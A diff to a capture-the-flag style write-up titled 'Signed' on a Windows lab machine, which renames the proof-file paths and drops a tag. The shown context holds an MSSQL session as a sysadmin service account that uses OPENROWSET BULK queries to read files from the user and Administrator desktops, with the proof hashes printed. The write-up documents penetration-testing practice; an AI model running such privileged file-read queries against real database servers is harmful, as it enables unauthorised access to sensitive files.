@@ -1,7 +1,7 @@
 ---
 title: Signed
 slug: Signed
-tags: [Windows, SilverTicket, Vulnerability Research]
+tags: [SilverTicket, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -289,12 +289,12 @@ SQL (SIGNED\mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
 Its `1` which means we are sysadmin.
 
 ```bash
-SQL (SIGNED\mssqlsvc  dbo@master)> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\mssqlsvc\Desktop\user.txt', SINGLE_CLOB) AS Contents;
+SQL (SIGNED\mssqlsvc  dbo@master)> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\mssqlsvc\Desktop\local-proof.txt', SINGLE_CLOB) AS Contents;
 BulkColumn
 ---------------------------------------
 b'85ed5dc0f036f3efd82f99696f5878e6\r\n'
 
-SQL (SIGNED\mssqlsvc  dbo@master)> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
+SQL (SIGNED\mssqlsvc  dbo@master)> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\privileged-proof.txt', SINGLE_CLOB) AS Contents;
 BulkColumn
 ---------------------------------------
 b'9527e9af8a8e0a52936fe378f68f2ee5\r\n'
